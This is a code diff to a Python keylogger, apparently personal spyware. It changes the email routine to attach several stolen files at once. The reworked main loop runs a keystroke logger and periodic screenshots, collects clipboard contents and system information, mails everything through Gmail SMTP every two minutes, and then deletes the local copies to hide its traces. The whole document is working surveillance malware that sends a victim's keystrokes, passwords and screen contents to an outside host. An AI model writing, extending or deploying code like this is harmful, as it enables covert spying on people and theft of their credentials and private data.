@@ -68,21 +68,26 @@ def get_active_window():
     except:
         return "Unknown Window"
     
-# Function to send an email with an attachment
-def send_email(filename, attachment_path, toaddr):
+# Function to send an email with multiple attachments
+def send_email(files, toaddr):
     msg = MIMEMultipart()
     msg['From'] = email_address
     msg['To'] = toaddr
-    msg['Subject'] = "Log File"
-    msg.attach(MIMEText(f"Attached: {filename}", 'plain'))
+    msg['Subject'] = "Log Files"
+    msg.attach(MIMEText("All collected files.", 'plain'))
 
-    with open(attachment_path, 'rb') as attachment:
-        p = MIMEBase('application', 'octet-stream')
-        p.set_payload(attachment.read())
-        encoders.encode_base64(p)
-        p.add_header('Content-Disposition', f"attachment; filename={filename}")
-        msg.attach(p)
+# Attach all files
+    for file in files:
+        file_path = file_merge + file
+        if os.path.exists(file_path):  # Verifies that the file exists before attaching it
+            with open(file_path, 'rb') as attachment:
+                p = MIMEBase('application', 'octet-stream')
+                p.set_payload(attachment.read())
+                encoders.encode_base64(p)
+                p.add_header('Content-Disposition', f"attachment; filename={file}")
+                msg.attach(p)
 
+# Send email
     s = smtplib.SMTP('smtp.gmail.com', 587)
     s.starttls()
     s.login(email_address, password)
@@ -135,13 +140,26 @@ def send_and_delete_files():
 
 # Main execution loop
 if __name__ == "__main__":
-    add_to_startup()
-    
-    threading.Thread(target=start_keylogger, daemon=True).start()
+   # Start the keylogger in a separate thread
+    listener_thread = threading.Thread(target=start_keylogger)
+    listener_thread.start()
+
+    # Start periodic screenshot thread
     threading.Thread(target=periodic_screenshot, daemon=True).start()
 
+    # Run the rest of the functions in the main thread
     while True:
+        # Step 1: Collect system info and clipboard content
         computer_information()
         copy_clipboard()
-        send_and_delete_files()
-        time.sleep(120)
+
+        # Step 2: Send all collected files in a single email
+        files_to_send = [keys_information, system_information, clipboard_information, screenshot_information]
+        send_email(files_to_send, toaddr)
+
+        # Step 3: Delete the files after sending
+        for file in files_to_send:
+            os.remove(file_merge + file)
+
+        # Step 4: Wait before next iteration
+        time.sleep(120)  # Adjust the time interval for the next cycle (in seconds)
